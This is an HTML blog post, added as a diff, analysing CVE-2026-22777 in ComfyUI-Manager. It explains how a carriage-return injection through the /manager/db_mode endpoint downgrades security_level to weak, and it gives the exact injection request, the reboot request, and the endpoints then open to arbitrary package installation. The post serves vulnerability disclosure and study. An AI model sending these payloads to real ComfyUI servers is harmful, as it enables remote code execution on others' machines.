@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width">
+	<title>CVE-2026-22777 ComfyUI Manager 从 Config CRLF Injection 到 RCE &ndash; # alert`D0n9` ｜ 输攻墨守</title>
+	<link rel="stylesheet" href="/css/styles.css">
+    <link rel="stylesheet" href="/css/nav.css">
+    
+    
+    
+    
+    
+	<link rel="stylesheet" href="/css/themes/light.css">
+</head>
+<body>
+	<input class="show-hide-menu-input" style="display:none;" autocomplete="off" type="checkbox" id="toggle-1">
+	<label class="overlay" for="toggle-1"></label>
+	<div class="main">
+		<header class="header">
+			<div class="header-content">
+				<div class="title">
+					<a href="http://localhost:1313/"># alert`D0n9` ｜ 输攻墨守</a>
+				</div>
+				<div>
+					<div class="header-right">
+						<label id="show-hide-menu-label" class="clickable-header-label" for="toggle-1">
+							<img class="color-adapting-image" width="30" src="/images/hamburger.svg" alt="menu button">
+						</label>
+					</div>
+					<div class="dont-show">
+						<p>
+							Links:
+						</p>
+					</div>
+					<ul class="links">
+						<li><a href="/">Home</a></li>
+						<li><a href="/posts/">Posts</a></li>
+						<li><a href="/about-me/">About Me</a></li>
+						<li><a href="/tags/">Tags</a></li>
+					</ul>
+				</div>
+			</div>
+		</header>
+		<main class="body">
+			<div class="body-content">
+  <header class="title-header">
+    <h1>CVE-2026-22777 ComfyUI Manager 从 Config CRLF Injection 到 RCE</h1>
+    <div class="title-header-date">
+        <time>Monday, January 12, 2026</time>
+    </div>
+    
+  </header>
+  <p>我在研究复现 CVE-2025-67303 ComfyUI-Manager RCE （ &lt; 3.38） 时发现了 RCE 3.38 版本的办法(实际可利用范围 &lt; 3.39.2, 4.0.0 - 4.0.4)，和 swing 一起研究确认这个属于 0day 漏洞， 考虑到 ComfyUI-Manager 已经默认集成在高版本 ComfyUI，所以这个漏洞也可以说是 ComfyUI 的问题</p>
+<p><a href="https://github.com/Comfy-Org/ComfyUI-Manager/security/advisories/GHSA-562r-8445-54r2">https://github.com/Comfy-Org/ComfyUI-Manager/security/advisories/GHSA-562r-8445-54r2</a></p>
+<h1 id="comfyui-安全机制">ComfyUI 安全机制<aside class="heading-anchor"><a href="#comfyui-安全机制" aria-label="Anchor"><img src="/images/chain-link.svg" class="color-adapting-image" height="20"></a></aside></h1>
+<p>ComfyUI 其中一个重要的安全机制是：通过配置文件（config.ini）中的 security_level 参数进行控制，不同安全等级对应不同的功能限制和适用场景。主要分为这四个等级：strong、normal、normal-、weak，我们只需要弄明白 normal 和 weak 的区别即可。</p>
+<ul>
+<li>
+<p><strong>normal</strong> 等级仅允许安装/卸载已知可信节点组件，但禁止安装任意 Git 仓库、pip 包或者未验证节点，也不能下载非 safetensors 格式的模型。</p>
+</li>
+<li>
+<p><strong>weak</strong> 等级几乎无安全限制，允许包括安装任意代码、访问系统文件、重启服务等所有操作，极易受攻击。</p>
+</li>
+</ul>
+<p>一般情况下，ComfyUI 默认运行在 normal 等级，以保证基本安全。如果攻击者可以将 security_level 降级为 weak，就有可能绕过所有限制，相当于直接获得系统控制权，可以实现远程命令执行（RCE）等高危操作。</p>
+<h1 id="漏洞详情">漏洞详情<aside class="heading-anchor"><a href="#漏洞详情" aria-label="Anchor"><img src="/images/chain-link.svg" class="color-adapting-image" height="20"></a></aside></h1>
+<ul>
+<li><strong>受影响组件</strong>: ComfyUI-Manager</li>
+<li><strong>漏洞类型</strong>: CRLF Injection &amp; RCE</li>
+<li><strong>攻击前提</strong>:
+<ol>
+<li>攻击者可以访问 ComfyUI 的 Web 端口。</li>
+</ol>
+</li>
+<li><strong>影响结果</strong>: 远程命令执行</li>
+</ul>
+<h2 id="3-深度根因分析">3. 深度根因分析<aside class="heading-anchor"><a href="#3-深度根因分析" aria-label="Anchor"><img src="/images/chain-link.svg" class="color-adapting-image" height="20"></a></aside></h2>
+<p>这个漏洞的成因是允许在 <code>normal</code> 安全级别下通过未经过滤的 API 接口向 <code>config.ini</code> 配置文件注入恶意配置项。</p>
+<p>在默认的 <code>normal</code> 安全级别下，可以利用 <code>/manager/db_mode</code> 接口，配合回车符（Carriage Return, <code>%0D</code>）绕过 <code>configparser</code> 的缩进机制，在配置文件的末尾写入 <code>security_level = weak</code>。由于 <code>db_mode</code> 是写入流程中的最后一项，注入的恶意配置会覆盖原有的安全设置。配合 <code>/manager/reboot</code> 接口重启服务后，系统将降级为 <code>weak</code> 安全模式，允许执行高风险操作（如安装任意 git 仓库、pip 包等），造成 RCE。</p>
+<h3 id="31-输入验证缺失">3.1 输入验证缺失<aside class="heading-anchor"><a href="#31-输入验证缺失" aria-label="Anchor"><img src="/images/chain-link.svg" class="color-adapting-image" height="20"></a></aside></h3>
+<p>在 <code>glob/manager_server.py</code> 中，<code>/manager/db_mode</code> 接口直接接收用户输入的 <code>value</code> 参数，并传给 <code>set_db_mode</code> 函数，未做任何合法性校验（如白名单检查）。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># glob/manager_server.py</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@routes.get</span><span class="p">(</span><span class="s2">&#34;/manager/db_mode&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">db_mode</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;value&#34;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">rel_url</span><span class="o">.</span><span class="n">query</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">set_db_mode</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">rel_url</span><span class="o">.</span><span class="n">query</span><span class="p">[</span><span class="s1">&#39;value&#39;</span><span class="p">])</span> <span class="c1"># 直接传入，无过滤</span>
+</span></span><span class="line"><span class="cl">        <span class="n">core</span><span class="o">.</span><span class="n">write_config</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># ...</span>
+</span></span></code></pre></div><h3 id="32-配置文件写入顺序缺陷">3.2 配置文件写入顺序缺陷<aside class="heading-anchor"><a href="#32-配置文件写入顺序缺陷" aria-label="Anchor"><img src="/images/chain-link.svg" class="color-adapting-image" height="20"></a></aside></h3>
+<p>在 <code>glob/manager_core.py</code> 的 <code>write_config</code> 函数中，配置项是按硬编码的字典顺序写入的。关键在于 <code>db_mode</code> 是<strong>最后</strong>一个被写入的字段。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># glob/manager_core.py</span>
+</span></span><span class="line"><span class="cl"><span class="n">config</span><span class="p">[</span><span class="s1">&#39;default&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># ... 前序字段 ...</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;security_level&#39;</span><span class="p">:</span> <span class="n">get_config</span><span class="p">()[</span><span class="s1">&#39;security_level&#39;</span><span class="p">],</span> <span class="c1"># 第 1696 行：写入当前的安全等级 (normal)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># ... 中间字段 ...</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;db_mode&#39;</span><span class="p">:</span> <span class="n">get_config</span><span class="p">()[</span><span class="s1">&#39;db_mode&#39;</span><span class="p">],</span>               <span class="c1"># 第 1699 行：写入用户可控的 db_mode</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>这意味着，如果在 <code>db_mode</code> 中注入内容，它会被写入到 <code>security_level</code> 的<strong>后面</strong>。根据 Python <code>configparser</code> 的解析规则（当 <code>strict=False</code> 时），如果文件中存在重复的 Key，<strong>后出现的值会覆盖先出现的值</strong>。</p>
+<h3 id="33-configparser-的解析特性与绕过">3.3 ConfigParser 的解析特性与绕过<aside class="heading-anchor"><a href="#33-configparser-的解析特性与绕过" aria-label="Anchor"><img src="/images/chain-link.svg" class="color-adapting-image" height="20"></a></aside></h3>
+<p>Python 的 <code>configparser</code> 在处理多行值时，要求后续行必须缩进（Indentation）。</p>
+<ul>
+<li><strong>直接换行 (<code>\n</code>)</strong>: <code>configparser</code> 在写入时，通常会将换行符处理为值的延续（Continuation Line），导致注入失败（被视为上一行值的一部分）。</li>
+<li><strong>回车符 (<code>\r</code> / <code>%0D</code>)</strong>: 在文件写入模式下，<code>\r</code> 会产生物理换行，但不会触发 <code>configparser</code> 自动添加缩进的前缀。当文件再次被读取时，解析器会将这行非缩进的文本识别为一个新的 Key-Value 对。</li>
+</ul>
+<h2 id="4-攻击利用链">4. 攻击利用链<aside class="heading-anchor"><a href="#4-攻击利用链" aria-label="Anchor"><img src="/images/chain-link.svg" class="color-adapting-image" height="20"></a></aside></h2>
+<h3 id="第一步crlf-注入配置">第一步：CRLF 注入配置<aside class="heading-anchor"><a href="#第一步crlf-注入配置" aria-label="Anchor"><img src="/images/chain-link.svg" class="color-adapting-image" height="20"></a></aside></h3>
+<p>攻击者发送以下请求：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/manager/db_mode?value=cache%0Dsecurity_level%20=%20weak</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">target-comfyui:8188</span>
+</span></span></code></pre></div><p><strong>Payload 解码</strong>: <code>cache\rsecurity_level = weak</code></p>
+<p><strong>写入后的 config.ini 样貌</strong>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ini" data-lang="ini"><span class="line"><span class="cl"><span class="k">[default]</span>
+</span></span><span class="line"><span class="cl"><span class="na">...</span>
+</span></span><span class="line"><span class="cl"><span class="na">security_level</span> <span class="o">=</span> <span class="s">normal  &lt;-- 原有配置</span>
+</span></span><span class="line"><span class="cl"><span class="na">...</span>
+</span></span><span class="line"><span class="cl"><span class="na">db_mode</span> <span class="o">=</span> <span class="s">cache</span>
+</span></span><span class="line"><span class="cl"><span class="na">security_level</span> <span class="o">=</span> <span class="s">weak    &lt;-- 注入配置 (由于无缩进，被解析为新Key)</span>
+</span></span></code></pre></div><h3 id="第二步使配置生效">第二步：使配置生效<aside class="heading-anchor"><a href="#第二步使配置生效" aria-label="Anchor"><img src="/images/chain-link.svg" class="color-adapting-image" height="20"></a></aside></h3>
+<p>由于 ComfyUI-Manager 将配置缓存在内存变量 <code>cached_config</code> 中，修改文件后不会立即生效。可以利用在 <code>normal</code> 级别下允许访问的重启接口：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/manager/reboot</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">target-comfyui:8188</span>
+</span></span></code></pre></div><h3 id="第三步权限利用">第三步：权限利用<aside class="heading-anchor"><a href="#第三步权限利用" aria-label="Anchor"><img src="/images/chain-link.svg" class="color-adapting-image" height="20"></a></aside></h3>
+<p>重启后，<code>security_level</code> 变为 <code>weak</code>。此时可以访问被保护的高危接口，例如：</p>
+<ul>
+<li><code>/customnode/install/git_url</code>: 安装任意恶意 Git 仓库（可能包含恶意 <code>install.py</code> 脚本从而导致 RCE）。</li>
+<li><code>/customnode/install/pip</code>: 安装任意 Python 包。</li>
+</ul>
+<hr>
+
+  
+  
+  <div class="post-tags">
+    <p>Tags: 
+    
+      <a href="/tags/%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90">技术分析</a>
+    
+      <a href="/tags/cve">CVE</a>
+    
+      <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a>
+    
+      <a href="/tags/web%E5%AE%89%E5%85%A8">Web安全</a>
+    
+    </p>
+  </div>
+  
+
+			</div>
+		</main>
+	</div>
+	<hr class="dont-show">
+	<footer class="footer">
+		<p>Powered by <a href="https://gohugo.io/">Hugo</a> &amp; <a href="https://github.com/stevenengler/no-js-hugo-theme">no-js-hugo-theme</a></p>
+	</footer>
+</body>
+</html>
